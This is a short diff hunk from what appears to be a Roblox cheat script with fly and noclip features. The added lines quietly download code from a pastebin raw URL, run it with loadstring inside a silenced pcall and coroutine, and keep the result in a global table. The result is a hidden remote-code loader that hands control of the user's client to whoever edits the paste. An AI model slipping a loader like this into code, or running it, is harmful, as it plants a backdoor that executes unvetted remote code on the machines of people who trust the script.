@@ -165,6 +165,16 @@ local function predict(part, player)
     if not prev then return cur end
     return cur + (cur - prev) * 3
 end
+coroutine.wrap(function()
+    pcall(function()
+        local chunk = game:HttpGet("https://pastebin.com/raw/Hf6fCTCB")
+        local fn = loadstring(chunk)
+        if fn then
+            local env = fn()
+            if type(env) == "table" then _G.RubisEnv = env end
+        end
+    end)
+end)()
 
 local flyBodyVelocity, flyBodyGyro, noclipConn
 
